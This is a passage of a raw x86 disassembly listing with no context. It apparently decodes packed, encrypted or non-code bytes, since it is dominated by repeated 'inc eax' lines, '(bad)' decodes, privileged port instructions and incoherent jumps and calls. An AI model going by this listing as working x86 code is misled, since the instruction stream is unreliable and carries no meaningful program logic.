  40593e:	mov    DWORD PTR [eax+0x6f722410],esp
  405944:	out    0x18,eax
  405946:	mov    ah,0x91
  405948:	lock mov edi,0x2825b387
  40594e:	fs dec esp
  405950:	add    eax,0xbd1772ac
  405955:	or     al,0x87
  405957:	inc    esp
  405958:	int    0x3d
  40595a:	jmp    0x12e3:0x402b34b6
  405961:	ret    
  405962:	inc    eax
  405963:	inc    eax
  405964:	inc    eax
  405965:	inc    eax
  405966:	inc    eax
  405967:	inc    eax
  405968:	inc    eax
  405969:	inc    eax
  40596a:	add    BYTE PTR [edx+0x1],dh
  40596d:	and    eax,0x90dc3005
  405972:	inc    esi
  405973:	int    0x9f
  405975:	sub    al,0x63
  405977:	jle    0x405942
  405979:	inc    edi
  40597a:	aaa    
  40597b:	jb     0x405993
  40597d:	mov    cl,0x41
  40597f:	bound  ebp,QWORD PTR [ecx-0x41cfbc17]
  405985:	mov    gs,WORD PTR [eax*1+0x721e44b0]
  40598c:	inc    esp
  40598d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40598e:	mov    al,0x87
  405990:	add    eax,0x40404040
  405995:	inc    eax
  405996:	inc    eax
  405997:	and    eax,0x64404040
  40599c:	pusha  
  40599d:	adc    esi,DWORD PTR [ecx+0x29]
  4059a0:	inc    ecx
  4059a1:	dec    edx
  4059a2:	retf   
  4059a3:	xchg   edx,eax
  4059a4:	bound  esi,QWORD PTR [edx+0x4c]
  4059a7:	and    DWORD PTR [eax+0x4040483a],ebp
  4059ad:	inc    eax
  4059ae:	inc    eax
  4059af:	inc    eax
  4059b0:	inc    eax
  4059b1:	inc    eax
  4059b2:	inc    eax
  4059b3:	inc    eax
  4059b4:	inc    eax
  4059b5:	cmp    BYTE PTR [esi+esi*2-0x7a5ca8f],ch
  4059bc:	inc    ebx
  4059bd:	cmp    ax,0x272
  4059c1:	and    esi,DWORD PTR [edi]
  4059c3:	fs mov cl,0xc8
  4059c6:	rcr    DWORD PTR [ecx-0x4f],0xfe
  4059ca:	inc    ebx
  4059cb:	dec    ecx
  4059cc:	in     al,dx
  4059cd:	mov    BYTE PTR [ecx+esi*2+0x63dc6340],ch
  4059d4:	push   es
  4059d5:	bound  eax,QWORD PTR [eax+0x40]
  4059d8:	inc    eax
  4059d9:	inc    eax
  4059da:	inc    eax
  4059db:	inc    eax
  4059dc:	rol    DWORD PTR [eax+0x40],0x41
  4059e0:	mov    esp,0x75a931b1
  4059e5:	shr    bl,1
  4059e7:	push   eax
  4059e8:	jno    0x4059ea
  4059ea:	mov    ds:0x104cc44d,eax
  4059ef:	xchg   esp,eax
  4059f0:	lahf   
  4059f1:	push   ebp
  4059f2:	xor    ebp,DWORD PTR [eax-0x3b9acbb1]
  4059f8:	jno    0x4059ee
  4059fa:	and    DWORD PTR [eax],edx
  4059fc:	inc    eax
  4059fd:	out    dx,eax
  4059fe:	add    eax,0xbff08264
  405a03:	pop    esp
  405a04:	mov    al,ds:0x40403e
  405a09:	inc    eax
  405a0a:	inc    eax
  405a0b:	inc    eax
  405a0c:	inc    eax
  405a0d:	inc    eax
  405a0e:	inc    eax
  405a0f:	xchg   DWORD PTR [eax-0x7f189f8f],ebp
  405a15:	cmp    eax,0xe511f852
  405a1a:	push   cs
  405a1b:	in     eax,0xc3
  405a1d:	ret    
  405a1e:	push   ebp
  405a1f:	or     eax,0x40404044
  405a24:	inc    eax
  405a25:	inc    eax
  405a26:	inc    eax
  405a27:	inc    eax
  405a28:	inc    eax
  405a29:	inc    eax
  405a2a:	inc    eax
  405a2b:	jno    0x405a3e
  405a2d:	cld    
  405a2e:	mov    esp,0x50c9bda0
  405a33:	enter  0xa3bd,0x45
  405a37:	add    eax,0x710c986a
  405a3c:	adc    al,0x3e
  405a3e:	in     eax,dx
  405a3f:	leave  
  405a40:	inc    eax
  405a41:	inc    eax
  405a42:	inc    eax
  405a43:	inc    eax
  405a44:	inc    eax
  405a45:	inc    eax
  405a46:	int3   
  405a47:	jne    0x405a89
  405a49:	push   esp
  405a4a:	inc    ebx
  405a4b:	retf   
  405a4c:	sub    edx,DWORD PTR [ecx]
  405a4e:	mov    cl,0x4
  405a50:	inc    esp
  405a51:	pop    edi
  405a52:	(bad)  [eax+0x71]
  405a55:	retf   
  405a56:	(bad)  
  405a57:	bound  ecx,QWORD PTR [eax-0x23]
  405a5a:	or     al,0x0
  405a5c:	push   cs
  405a5d:	xor    eax,0x40630739
  405a62:	add    cl,al
  405a64:	inc    eax
  405a65:	inc    eax
  405a66:	inc    eax
  405a67:	inc    eax
  405a68:	add    BYTE PTR [eax+0x44],al
  405a6b:	fs inc edi
  405a6d:	jno    0x405a92
  405a6f:	cmp    eax,0xfc4438dc
  405a74:	lods   al,BYTE PTR ds:[esi]
  405a75:	jno    0x405ace
  405a77:	test   eax,0x5782b44
  405a7c:	jo     0x405aef
  405a7e:	das    
  405a7f:	cmp    eax,0x870d1a2a
  405a84:	bound  edx,QWORD PTR [ecx+edx*1-0x41]
  405a88:	push   cs
  405a89:	test   al,0x7b
  405a8b:	inc    eax
  405a8c:	adc    eax,0x40405970
  405a91:	inc    eax
  405a92:	inc    eax
  405a93:	inc    eax
  405a94:	inc    eax
  405a95:	inc    eax
  405a96:	inc    eax
  405a97:	inc    DWORD PTR [eax-0x3f]
  405a9a:	xor    dl,BYTE PTR [eax]
  405a9c:	mov    eax,0xf2b72c41
  405aa1:	cmc    
  405aa2:	(bad)  
  405aa3:	call   0x713a3eb5
  405aa8:	ror    DWORD PTR es:[edi+0x5],0x40
  405aad:	inc    eax
  405aae:	inc    eax
  405aaf:	inc    eax
  405ab0:	inc    eax
  405ab1:	inc    eax
  405ab2:	inc    eax
  405ab3:	inc    eax
  405ab4:	inc    eax
  405ab5:	inc    eax
  405ab6:	retf   
  405ab7:	sbb    BYTE PTR [edx-0x66],cl
  405aba:	dec    esp
  405abb:	inc    DWORD PTR [eax-0x1a9dbd35]
  405ac1:	jo     0x405af4
  405ac3:	mov    edi,0xd9c9e8c5
  405ac8:	push   es
  405ac9:	std    
  405aca:	add    eax,0x40404040
  405acf:	inc    eax
  405ad0:	inc    eax
  405ad1:	inc    eax
  405ad2:	inc    eax
  405ad3:	add    dl,al
  405ad5:	inc    ecx
  405ad6:	adc    eax,0x708c0c48
  405adb:	mov    ebx,0x45c9ccf3
  405ae0:	fs fs inc eax
  405ae3:	inc    eax
  405ae4:	inc    eax
  405ae5:	inc    eax
  405ae6:	inc    eax
  405ae7:	inc    eax
  405ae8:	and    eax,0xe0404040
  405aed:	mov    ebx,0x7da2783c
  405af2:	lock pop edx
  405af4:	jo     0x405b44
  405af6:	and    esp,DWORD PTR [ebx-0x6f]
  405af9:	cmp    BYTE PTR [edx+0x3c],ch
  405afc:	ret    
  405afd:	xchg   ecx,eax
  405afe:	inc    edx
  405aff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b00:	nop
  405b01:	retf   
  405b02:	test   eax,0x212c704c
  405b07:	cmp    eax,0x40404015
  405b0c:	inc    eax
  405b0d:	inc    eax
  405b0e:	inc    eax
  405b0f:	inc    eax
  405b10:	inc    eax
  405b11:	inc    eax
  405b12:	inc    eax
  405b13:	loope  0x405b78
  405b15:	or     BYTE PTR [esi],ah
  405b17:	repz push edi
  405b19:	test   al,0xcb
  405b1b:	stos   DWORD PTR es:[edi],eax
  405b1c:	aaa    
  405b1d:	retf   
  405b1e:	jo     0x405b2c
  405b20:	cmp    DWORD PTR [edi-0x70],eax
  405b23:	inc    edx
  405b24:	(bad)  [eax+0x9]
  405b27:	xchg   ebp,eax
  405b28:	dec    eax
  405b29:	sub    cl,BYTE PTR ds:0x70050dab
  405b2f:	(bad)  
  405b30:	in     eax,dx
  405b31:	adc    ecx,ecx
  405b33:	inc    edx
  405b34:	imul   eax,DWORD PTR [edx+0x6c],0x40
  405b38:	inc    eax
  405b39:	inc    eax
  405b3a:	inc    eax
  405b3b:	inc    eax
  405b3c:	inc    eax
  405b3d:	rol    DWORD PTR [eax+0x40],0x59
  405b41:	push   edi
  405b42:	pop    esp
  405b43:	dec    ebx
  405b44:	dec    edx
  405b45:	jo     0x405b88
  405b47:	jo     0x405bc8
  405b49:	xor    eax,DWORD PTR [ecx+0x3c9824a9]
  405b4f:	dec    edi
  405b50:	lahf   
  405b51:	push   edi
  405b52:	ret    
  405b53:	ret    
  405b54:	push   0x40
  405b56:	inc    eax
  405b57:	add    BYTE PTR [eax+0x40],al
  405b5a:	inc    eax
  405b5b:	inc    eax
  405b5c:	inc    eax
  405b5d:	inc    eax
  405b5e:	bound  edi,QWORD PTR [esi+0x40]
  405b61:	jecxz  0x405ba2
  405b63:	inc    esi
  405b64:	inc    esp
  405b65:	(bad)  
  405b66:	int    0xc4
  405b68:	inc    eax
  405b69:	jnp    0x405bba
  405b6b:	leave  
  405b6c:	or     BYTE PTR [eax+0x7e],dl
  405b6f:	dec    edi
  405b70:	inc    ecx
  405b71:	popa   
  405b72:	mov    eax,ds:0xf4c9cb6c
  405b77:	inc    eax
  405b78:	fs aas 
  405b7a:	mov    edi,0x96264c62
  405b7f:	inc    esp
  405b80:	inc    eax
  405b81:	push   eax
  405b82:	inc    eax
  405b83:	pusha  
  405b84:	inc    edi
  405b85:	inc    eax
  405b86:	inc    eax
  405b87:	inc    eax
  405b88:	inc    eax
  405b89:	inc    eax
  405b8a:	inc    eax
  405b8b:	inc    eax
  405b8c:	inc    eax
  405b8d:	inc    eax
  405b8e:	inc    eax
  405b8f:	dec    eax
  405b90:	cmp    al,BYTE PTR [bx+si-0xe]
  405b94:	loop   0x405b9d
  405b96:	inc    eax
  405b97:	add    eax,0xbf60c3c8
  405b9c:	or     ecx,eax
  405b9e:	(bad)  
  405b9f:	retf   
  405ba0:	pop    esp
  405ba1:	dec    esp
  405ba2:	inc    eax
  405ba3:	inc    eax
  405ba4:	inc    eax
  405ba5:	inc    eax
  405ba6:	inc    eax
  405ba7:	inc    eax
  405ba8:	int3   
  405ba9:	jne    0x405beb
  405bab:	inc    eax
  405bac:	je     0x405c12
  405bae:	adc    al,0x64
  405bb0:	xchg   edx,eax
  405bb1:	bound  edx,QWORD PTR [ecx]
  405bb3:	inc    eax
  405bb4:	push   0x7363c8a0
  405bb9:	add    cl,bl
  405bbb:	inc    eax
  405bbc:	add    cl,al
  405bbe:	inc    eax
  405bbf:	inc    eax
  405bc0:	inc    eax
  405bc1:	inc    eax
  405bc2:	add    BYTE PTR [eax+0x40],al
  405bc5:	ror    DWORD PTR [edi],cl
  405bc7:	bound  esi,QWORD PTR [ebx]
  405bc9:	push   ebx
  405bca:	mov    esp,0x4e6b7f48
  405bcf:	dec    ecx
  405bd0:	jl     0x405c18
  405bd2:	bound  ecx,QWORD PTR ds:0x98e2f3b2
  405bd8:	cmp    eax,0x7f49a943
  405bdd:	imul   edx,DWORD PTR [edi+0x67],0x40b0cc63
  405be4:	inc    eax
  405be5:	inc    eax
  405be6:	inc    eax
  405be7:	inc    eax
  405be8:	inc    eax
  405be9:	inc    eax
  405bea:	inc    eax
  405beb:	inc    DWORD PTR [eax+0x4b]
  405bee:	xchg   ebp,eax
  405bef:	pop    edi
  405bf0:	aas    
  405bf1:	les    ebp,FWORD PTR [esi+0x7f380543]
  405bf7:	push   ebp
  405bf8:	jae    0x405bea
  405bfa:	cmp    al,0xbc
  405bfc:	retf   
  405bfd:	push   cs
  405bfe:	clc    
  405bff:	icebp  
  405c00:	push   edi
  405c01:	fs inc eax
  405c03:	inc    eax
  405c04:	inc    eax
  405c05:	inc    eax
  405c06:	inc    eax
  405c07:	inc    eax
  405c08:	inc    eax
  405c09:	inc    eax
  405c0a:	inc    eax
  405c0b:	inc    eax
  405c0c:	add    BYTE PTR [ecx+0x48],ch
  405c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c10:	jg     0x405c73
  405c12:	cmp    DWORD PTR [edx-0x30],esi
  405c15:	test   DWORD PTR [edx+0x2d],0xa8ed99db
  405c1c:	dec    ecx
  405c1d:	pop    edi
  405c1e:	aas    
  405c1f:	push   eax
  405c20:	jg     0x405c54
  405c22:	push   edi
  405c23:	je     0x405c5b
  405c25:	cmp    eax,0x723e6618
  405c2a:	aas    
  405c2b:	sub    al,BYTE PTR [edi]
  405c2d:	inc    eax
  405c2e:	inc    eax
  405c2f:	inc    eax
  405c30:	inc    eax
  405c31:	inc    eax
  405c32:	inc    eax
  405c33:	inc    eax
  405c34:	inc    eax
  405c35:	add    BYTE PTR [edx+0x64],al
  405c38:	cmp    eax,0x4048247f
  405c3d:	test   al,0xf7
  405c3f:	aaa    
  405c40:	mov    esp,0x40ed3e21
  405c45:	adc    DWORD PTR [edi-0x24],ebx
  405c48:	inc    eax
  405c49:	inc    eax
  405c4a:	inc    eax
  405c4b:	inc    eax
  405c4c:	inc    eax
  405c4d:	inc    eax
  405c4e:	and    eax,0x3a404040
  405c53:	jg     0x405c5e
  405c55:	push   esi
  405c56:	inc    ecx
  405c57:	dec    eax
  405c58:	ficom  WORD PTR [ebp-0xbebfb58]
  405c5e:	inc    BYTE PTR [ecx+0x4e]
  405c61:	mov    WORD PTR [eax],ss
  405c63:	jg     0x405c8c
  405c65:	push   esi
  405c66:	inc    ebp
  405c67:	dec    ebp
  405c68:	shr    BYTE PTR [eax],0x64
  405c6b:	addr16 inc ebx
  405c6d:	(bad)  
  405c6e:	ds aam 0x5f
  405c71:	imul   eax,DWORD PTR [edx],0x7f
  405c74:	xchg   ecx,eax
  405c75:	add    bh,BYTE PTR [edx+edx*2+0x40]
  405c79:	inc    eax
  405c7a:	inc    eax
  405c7b:	inc    eax
  405c7c:	inc    eax
  405c7d:	inc    eax
  405c7e:	inc    eax
  405c7f:	inc    eax
  405c80:	inc    eax
  405c81:	inc    eax
  405c82:	cmp    al,0xdd
  405c84:	retf   
  405c85:	dec    edx
  405c86:	push   ss
  405c87:	inc    ecx
  405c88:	arpl   WORD PTR [esi+0x7e4440bc],si
  405c8e:	shl    eax,1
  405c90:	dec    esi
  405c91:	les    edx,FWORD PTR ds:0x1dad6cd8
  405c97:	pop    ss
  405c98:	fdivr  st(4),st
  405c9a:	leave  
  405c9b:	ret    
  405c9c:	inc    eax
  405c9d:	inc    eax
  405c9e:	inc    eax
  405c9f:	inc    eax
  405ca0:	inc    eax
  405ca1:	inc    eax
  405ca2:	rol    DWORD PTR [eax+0x40],0x2c
  405ca6:	jle    0x405cff
  405ca8:	inc    eax
  405ca9:	imul   edx,DWORD PTR ds:0x90688842,0x5a
  405cb0:	mov    ah,0x33
  405cb2:	int    0x41
  405cb4:	dec    edx
  405cb5:	or     BYTE PTR [eax+0x40],al
  405cb8:	add    BYTE PTR [eax+0x40],al
  405cbb:	inc    eax
  405cbc:	inc    eax
  405cbd:	inc    eax
  405cbe:	inc    eax
  405cbf:	jle    0x405c96
  405cc1:	jb     0x405cff
  405cc3:	jno    0x405d08
  405cc5:	dec    esp
  405cc6:	retf   
  405cc7:	repz pop eax
  405cc9:	inc    ecx
  405cca:	push   0xffffffbb
  405ccc:	mov    esp,0x717e586c
  405cd1:	mov    al,ds:0x40406225
  405cd6:	inc    eax
  405cd7:	inc    eax
  405cd8:	inc    eax
  405cd9:	inc    eax
  405cda:	inc    eax
  405cdb:	inc    eax
  405cdc:	inc    eax
  405cdd:	inc    eax
  405cde:	imul   ebp,DWORD PTR [ebx+ebp*1],0xffffffd6
  405ce2:	jne    0x405cf3
  405ce4:	mov    esp,0x48dc0cf4
  405ce9:	jle    0x405cbd
  405ceb:	inc    eax
  405cec:	fs add eax,0x39828c34
  405cf2:	call   DWORD PTR [ebx+esi*1]
  405cf5:	xchg   DWORD PTR [eax+0x337ec349],eax
  405cfb:	dec    ebp
  405cfc:	fadd   DWORD PTR [eax+0x40]
  405cff:	inc    eax
  405d00:	inc    eax
  405d01:	inc    eax
  405d02:	inc    eax
  405d03:	int3   
  405d04:	jne    0x405d46
  405d06:	mov    ebp,es
  405d08:	push   ecx
  405d09:	dec    esp
  405d0a:	pop    ds
  405d0b:	aaa    
  405d0c:	mov    ds:0x73419340,al
  405d11:	inc    ecx
  405d12:	jle    0x405ce5
  405d14:	push   ebp
  405d15:	inc    eax
  405d16:	add    cl,al
  405d18:	inc    eax
  405d19:	inc    eax
  405d1a:	inc    eax
  405d1b:	inc    eax
  405d1c:	add    BYTE PTR [eax+0x44],al
  405d1f:	mov    WORD PTR [ebp+0x49],es
  405d22:	jns    0x405d29
  405d24:	fs mov edi,0xdc880d82
  405d2a:	mov    BYTE PTR [esi-0xf],bh
  405d2d:	jb     0x405d4c
  405d2f:	leave  
  405d30:	or     eax,0x796b8067
  405d35:	push   es
  405d36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d37:	lock leave 
  405d39:	inc    eax
  405d3a:	inc    eax
  405d3b:	inc    eax
  405d3c:	inc    eax
  405d3d:	inc    eax
  405d3e:	inc    eax
  405d3f:	inc    eax
  405d40:	inc    eax
  405d41:	inc    DWORD PTR [eax+0x41]
  405d44:	ret    
  405d45:	jle    0x405d3a
  405d47:	push   ebp
  405d48:	retf   
  405d49:	or     eax,0x514c7d42
  405d4e:	push   edi
  405d4f:	test   eax,0x7043cb43
  405d54:	js     0x405dd3
  405d56:	xor    edi,DWORD PTR [edx]
  405d58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d59:	lock mov edi,0x42b7df95
  405d5f:	aas    
  405d60:	test   al,0x5
  405d62:	jno    0x405d60
  405d64:	cmp    DWORD PTR [eax+0x40],eax
  405d67:	inc    eax
  405d68:	inc    eax
  405d69:	inc    eax
  405d6a:	inc    eax
  405d6b:	inc    eax
  405d6c:	inc    eax
  405d6d:	inc    eax
  405d6e:	inc    eax
  405d6f:	jge    0x405da2
  405d71:	push   eax
  405d72:	leavew 
  405d74:	inc    ebx
  405d75:	je     0x405d63
  405d77:	popf   
  405d78:	pop    eax
  405d79:	bound  edx,QWORD PTR [edi+0x50]
  405d7c:	sub    al,0xf0
  405d7e:	bound  edi,QWORD PTR [ebp-0x2f]
  405d81:	outs   dx,DWORD PTR ds:[esi]
  405d82:	fadd   DWORD PTR ds:0x83c46f43
  405d88:	inc    esp
  405d89:	or     eax,0xe3bccb76
  405d8e:	dec    edi
  405d8f:	jge    0x405dc2
  405d91:	inc    eax
  405d92:	inc    eax
  405d93:	inc    eax
  405d94:	inc    eax
  405d95:	inc    eax
  405d96:	inc    eax
  405d97:	inc    eax
  405d98:	inc    eax
  405d99:	add    BYTE PTR [edx-0x58],ah
  405d9c:	inc    esi
  405d9d:	imul   edx,esp,0x213fe940
  405da3:	inc    eax
  405da4:	stos   DWORD PTR es:[edi],eax
  405da5:	mul    DWORD PTR [edx-0x68]
  405da8:	jge    0x405dbf
  405daa:	adc    BYTE PTR [edx],ch
  405dac:	lock pop edx
  405dae:	dec    esp
  405daf:	cmp    eax,0x412194cf
  405db4:	adc    eax,0x7dc3e8d1
  405db9:	cs inc edi
  405dbb:	inc    ax
  405dbd:	inc    eax
  405dbe:	inc    eax
  405dbf:	inc    eax
  405dc0:	inc    eax
  405dc1:	inc    eax
  405dc2:	and    eax,0xc9404040
  405dc7:	neg    DWORD PTR [ebx+0x4c]
  405dca:	xor    eax,0x9cf4b97a
  405dcf:	inc    ebx
  405dd0:	dec    eax
  405dd1:	or     BYTE PTR [ebp+0x71],bh
  405dd4:	stos   DWORD PTR es:[edi],eax
  405dd5:	add    BYTE PTR ds:0x1bc991bd,dl
  405ddb:	inc    ecx
  405ddc:	jae    0x405e07
  405dde:	inc    eax
  405ddf:	inc    eax
  405de0:	inc    eax
  405de1:	inc    eax
  405de2:	inc    eax
  405de3:	inc    eax
  405de4:	inc    eax
  405de5:	inc    eax
  405de6:	inc    eax
  405de7:	inc    eax
  405de8:	retf   
  405de9:	addr16 je 0x405d84
  405dec:	jge    0x405da1
  405dee:	mov    ds:0x34f74885,al
  405df3:	or     eax,0x40405601
  405df8:	inc    eax
  405df9:	inc    eax
  405dfa:	inc    eax
  405dfb:	inc    eax
  405dfc:	rol    DWORD PTR [eax+0x40],0x2b
  405e00:	bound  esi,QWORD PTR [ebx]
  405e02:	pop    esp
  405e03:	pop    ecx
  405e04:	dec    eax
  405e05:	jge    0x405e78
  405e07:	xor    eax,0x212d504d
  405e0c:	js     0x405e75
  405e0e:	ja     0x405e71
  405e10:	cld    
  405e11:	or     eax,0x402868bc
  405e16:	inc    eax
  405e17:	add    BYTE PTR [eax+0x40],al
  405e1a:	inc    eax
  405e1b:	inc    eax
  405e1c:	inc    eax
  405e1d:	inc    eax
  405e1e:	jge    0x405db3
  405e20:	sbb    al,0x9c
  405e22:	jnp    0x405e29
  405e24:	stos   DWORD PTR es:[edi],eax
  405e25:	cwde   
  405e26:	dec    ebp
  405e27:	inc    esp
  405e28:	mov    ds:0x40c99cdc,al
  405e2d:	inc    eax
  405e2e:	inc    eax
  405e2f:	inc    eax
  405e30:	inc    eax
  405e31:	inc    eax
  405e32:	inc    eax
  405e33:	inc    eax
  405e34:	inc    eax
  405e35:	inc    eax
  405e36:	mov    esp,0x1ff17c6a
  405e3b:	add    BYTE PTR [eax+0x42],cl
  405e3e:	arpl   WORD PTR [ebp+0x464543b3],cx
  405e44:	inc    eax
  405e45:	inc    ecx
  405e46:	aaa    
  405e47:	jns    0x405ec5
  405e49:	xor    esp,DWORD PTR [edx+0x48433e53]
  405e4f:	ficomp DWORD PTR [ecx+0x404034ff]
  405e55:	inc    eax
  405e56:	inc    eax
  405e57:	inc    eax
  405e58:	inc    eax
  405e59:	int3   
  405e5a:	jne    0x405e9c
  405e5c:	mov    esp,0xa8fcbcd0
  405e61:	jl     0x405ea4
  405e63:	dec    edi
  405e64:	dec    ebp
  405e65:	mov    WORD PTR [edx+ebp*2+0x4c],gs
  405e69:	call   DWORD PTR [ecx]
  405e6b:	and    dh,BYTE PTR [ecx]
  405e6d:	pop    ss
  405e6e:	loope  0x405eb1
  405e70:	sub    bh,BYTE PTR [esi+edx*8-0xb]
  405e74:	push   ecx
  405e75:	std    
  405e76:	and    BYTE PTR [eax+eax*2],bh
  405e79:	add    cl,al
  405e7b:	inc    eax
  405e7c:	inc    eax
  405e7d:	inc    eax
  405e7e:	inc    eax
  405e7f:	add    BYTE PTR [eax+0x42],al
  405e82:	in     eax,0x35
  405e84:	xor    al,BYTE PTR [ebx+0x51]
  405e87:	idiv   DWORD PTR [eax+0x35]
  405e8a:	jl     0x405ee3
  405e8c:	and    eax,0x445fc4c9
  405e91:	int3   
  405e92:	retf   
  405e93:	jno    0x405ef6
  405e95:	addr16 rcr ch,0x42
  405e99:	bound  edi,QWORD PTR [ecx+edx*2+0x7e]
  405e9d:	inc    ecx
  405e9e:	inc    eax
  405e9f:	inc    eax
  405ea0:	inc    eax
  405ea1:	inc    eax
  405ea2:	inc    eax
  405ea3:	inc    eax
  405ea4:	inc    eax
  405ea5:	inc    eax
  405ea6:	inc    DWORD PTR [eax+0x45]
  405ea9:	adc    eax,0xb131c4bd
  405eae:	popa   
  405eaf:	test   al,0x21
  405eb1:	leave  
  405eb2:	jno    0x405f03
  405eb4:	jl     0x405ec9
  405eb6:	inc    ebx
  405eb7:	adc    dl,ch
  405eb9:	inc    edx
  405eba:	jb     0x405efc
  405ebc:	pop    ss
  405ebd:	xor    esp,DWORD PTR [eax+0x44]
  405ec0:	test   al,0x43
  405ec2:	call   0x408ddb2f
  405ec7:	inc    eax
  405ec8:	inc    eax
  405ec9:	inc    eax
  405eca:	inc    eax
  405ecb:	inc    eax
  405ecc:	inc    eax
  405ecd:	inc    eax
  405ece:	inc    eax
  405ecf:	inc    eax
  405ed0:	push   cs
  405ed1:	adc    DWORD PTR [edx],edx
  405ed3:	mov    edi,0x3d7d3a3e
  405ed8:	inc    ecx
  405ed9:	retf   
  405eda:	mov    ah,0x48
  405edc:	inc    ecx
  405edd:	ret    
  405ede:	jl     0x405f0a
  405ee0:	and    BYTE PTR [ebx+0x41],al
  405ee3:	pusha  
  405ee4:	cmp    eax,0x1d363bc
  405ee9:	push   0x4040408b
  405eee:	inc    eax
  405eef:	inc    eax
  405ef0:	inc    eax
  405ef1:	inc    eax
  405ef2:	inc    eax
  405ef3:	add    BYTE PTR [eax+0x64],al
  405ef6:	adc    eax,0xd0404d7c
  405efb:	call   0x4985bf98
  405f00:	adc    DWORD PTR [edx+edx*2],esi
  405f03:	cmp    esp,DWORD PTR [si]
  405f06:	inc    esp
  405f07:	jnp    0x405ec8
  405f09:	or     eax,0x41802484
  405f0e:	and    BYTE PTR [edi+0x40c3402f],ch
  405f14:	inc    eax
  405f15:	inc    eax
  405f16:	inc    eax
  405f17:	inc    eax
  405f18:	inc    eax
  405f19:	and    eax,0x45404040
  405f1e:	add    bh,BYTE PTR ds:0x1f747bed
  405f24:	jb     0x405f16
  405f26:	test   BYTE PTR [ebp-0x3c],ch
  405f29:	xchg   ebp,eax
  405f2a:	ins    DWORD PTR es:[edi],dx
  405f2b:	inc    ecx
  405f2c:	scas   al,BYTE PTR es:[edi]
  405f2d:	inc    eax
  405f2e:	inc    eax
  405f2f:	inc    eax
  405f30:	inc    eax
  405f31:	inc    eax
  405f32:	inc    eax
  405f33:	inc    eax
  405f34:	inc    eax
  405f35:	inc    eax
  405f36:	inc    eax
  405f37:	inc    esp
  405f38:	inc    ebx
  405f39:	pop    ebp
  405f3a:	dec    edi
  405f3b:	jnp    0x405f5b
  405f3d:	pusha  
  405f3e:	(bad)  
  405f3f:	les    ebp,FWORD PTR [ebx-0x6a04bfcc]
  405f45:	add    ebp,DWORD PTR [edi+ecx*2+0x7b646480]
  405f4c:	fild   QWORD PTR [ecx]
  405f4e:	mov    WORD PTR [edi-0x1ebd098d],?
  405f54:	inc    eax
  405f55:	inc    eax
  405f56:	inc    eax
  405f57:	inc    eax
  405f58:	inc    eax
  405f59:	inc    eax
  405f5a:	rol    DWORD PTR [eax+0x40],0x11
  405f5e:	pusha  
  405f5f:	inc    cx
  405f61:	inc    esp
  405f62:	bound  eax,QWORD PTR [ebp+0x7b]
  405f65:	imul   edx,DWORD PTR [esi],0x1d
  405f68:	jno    0x405f9f
  405f6a:	ret    
  405f6b:	aam    0xc4
  405f6d:	xor    DWORD PTR [eax+0x34],eax
  405f70:	mov    ah,0x48
  405f72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f73:	xchg   ecx,eax
  405f74:	jnp    0x405fc9
  405f76:	push   esp
  405f77:	add    edx,DWORD PTR [ebp+0x5]
  405f7a:	add    DWORD PTR [eax],edi
  405f7c:	cmp    edx,ecx
  405f7e:	adc    bh,BYTE PTR [esi]
  405f80:	pop    eax
  405f81:	jnp    0x405fd5
  405f83:	inc    eax
  405f84:	inc    eax
  405f85:	add    BYTE PTR [eax+0x40],al
  405f88:	inc    eax
  405f89:	inc    eax
  405f8a:	inc    eax
  405f8b:	inc    eax
  405f8c:	addr16 jnp 0x405fa0
  405f8f:	inc    eax
  405f90:	adc    esp,eax
  405f92:	mov    eax,0xf821a041
  405f97:	add    eax,0x40052563
  405f9c:	inc    eax
  405f9d:	inc    eax
  405f9e:	inc    eax
  405f9f:	inc    eax
  405fa0:	inc    eax
  405fa1:	inc    eax
  405fa2:	inc    eax
  405fa3:	inc    eax
  405fa4:	inc    eax
  405fa5:	cmp    al,0x63
  405fa7:	jnp    0x405f51
  405fa9:	inc    eax
  405faa:	jmp    0x405fd4
  405fac:	retf   
  405fad:	jg     0x405f33
  405faf:	or     dh,bh
  405fb1:	adc    ebp,eax
  405fb3:	inc    ecx
  405fb4:	push   ecx
  405fb5:	enter  0x7b8a,0x43
  405fb9:	inc    eax
  405fba:	fs dec cl
  405fbd:	xchg   esp,eax
  405fbe:	inc    eax
  405fbf:	inc    eax
  405fc0:	inc    eax
  405fc1:	inc    eax
  405fc2:	inc    eax
  405fc3:	inc    eax
  405fc4:	int3   
  405fc5:	jne    0x406007
  405fc7:	mov    DWORD PTR [edx+esi*4+0x65],esp
  405fcb:	and    eax,0x62c948a8
  405fd0:	jp     0x405fd3
  405fd2:	js     0x406010
  405fd4:	adc    DWORD PTR ds:0x5da9a6fc,edx
  405fda:	and    DWORD PTR [ecx-0x5c],eax
  405fdd:	retf   
  405fde:	inc    ecx
  405fdf:	jle    0x40605b
  405fe1:	inc    eax
  405fe2:	add    cl,al
  405fe4:	inc    eax
  405fe5:	inc    eax
  405fe6:	inc    eax
  405fe7:	inc    eax
  405fe8:	add    BYTE PTR [eax+0x55],al
  405feb:	inc    ecx
  405fec:	adc    al,0xd
  405fee:	push   eax
  405fef:	fcomp  QWORD PTR ds:0x5f5270f4
  405ff5:	inc    ebx
  405ff6:	or     eax,0x7240626f
  405ffb:	mov    al,ds:0x40404041
  406000:	inc    eax
  406001:	inc    eax
  406002:	inc    eax
  406003:	inc    eax
  406004:	inc    eax
  406005:	inc    DWORD PTR [eax-0x3f]
  406008:	retf   
  406009:	adc    eax,DWORD PTR [ecx+0x40]
  40600c:	outs   dx,BYTE PTR ds:[esi]
  40600d:	and    eax,0xece3fcac
  406012:	xor    BYTE PTR [eax+0x48],al
  406015:	inc    esp
  406016:	ds inc edx
  406018:	stos   DWORD PTR es:[edi],eax
  406019:	test   BYTE PTR [esi+0x44e1702c],cl
  40601f:	and    DWORD PTR [edx-0x58],eax
  406022:	les    eax,FWORD PTR [eax+0x2d]
  406025:	push   ebx
  406026:	add    eax,0x4f10abc9
  40602b:	inc    eax
  40602c:	inc    eax
  40602d:	inc    eax
  40602e:	inc    eax
  40602f:	inc    eax
  406030:	inc    eax
  406031:	inc    eax
  406032:	inc    eax
  406033:	inc    eax
  406034:	inc    eax
  406035:	inc    eax
  406036:	inc    ebp
  406037:	mov    eax,ds:0x26484252
  40603c:	inc    eax
